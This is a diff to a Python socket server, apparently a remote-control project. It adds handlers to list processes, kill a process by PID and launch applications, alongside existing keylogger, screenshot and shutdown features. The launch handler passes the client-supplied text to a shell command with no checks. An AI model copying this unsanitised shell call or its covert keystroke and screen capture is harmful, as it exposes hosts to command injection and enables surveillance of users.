@@ -1,7 +1,10 @@
+import io
+import json
+import psutil
 import socket
 import threading
+import subprocess
 from PIL import ImageGrab  # Để chụp màn hình
-import io
 from keylogger import Keylogger
 from shutdown import ServerShutdownWindow
 import psutil
@@ -83,9 +86,39 @@ class Server:
             shutdown_window = ServerShutdownWindow(self)
             shutdown_window.start()
             return "Server đã tắt"
+        elif request == "apps":
+            apps = self.get_running_applications()
+            return json.dumps(apps)
+        elif request == "processus":
+            processes = self.get_running_processus()
+            return json.dumps(processes)
+        elif request.startswith("kill"):
+            try:
+                _, pid_str = request.split(" ", 1)  # Tách lệnh và PID
+                pid = int(pid_str)  # Chuyển PID thành số nguyên
+                return self.kill(pid)
+            except ValueError:
+                return "Invalid PID."
+        elif request.startswith("start"):
+            try:
+                _, app_name = request.split(" ", 1)  # Tách lệnh và tên ứng dụng
+                subprocess.Popen(["start", app_name], shell=True)
+                return f"Started application: {app_name}"
+            except ValueError:
+                return "Invalid application name."
         else:
             return "Invalid request."
 
+    # kill process
+    def kill(self, pid):
+        try:
+            process = psutil.Process(pid)
+            process.terminate()  # Kết thúc quy trình
+            return f"Process with PID {pid} terminated."
+        except psutil.NoSuchProcess:
+                return "Process not found."
+    
+    # screenshot   
     def capture_screenshot(self):
         try:
             screenshot = ImageGrab.grab()
@@ -94,6 +127,27 @@ class Server:
             return image_byte_array.getvalue()
         except Exception as e:
             return f"Error capturing screenshot: {str(e)}"
+    # running process
+    def get_running_processus(self):
+        processus_list = []
+        for proc in psutil.process_iter(["name", "pid", "num_threads"]):
+            try:
+                if proc.info["name"] and proc.info["pid"] and proc.info["num_threads"]:
+                    process_info = {
+                        "ProcessName": proc.info["name"],
+                        "PID": proc.info["pid"],
+                        "ThreadCount": proc.info["num_threads"]
+                    }
+                    processus_list.append(process_info)
+            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+                pass
+  
+        return processus_list
+    # running apps, same as process
+    def get_running_applications(self):
+        apps_list = self.get_running_processus()
+        return apps_list
+        
 # Tạo một đối tượng Server và khởi động server cùng với keylogger
 if __name__ == "__main__":
     server = Server()
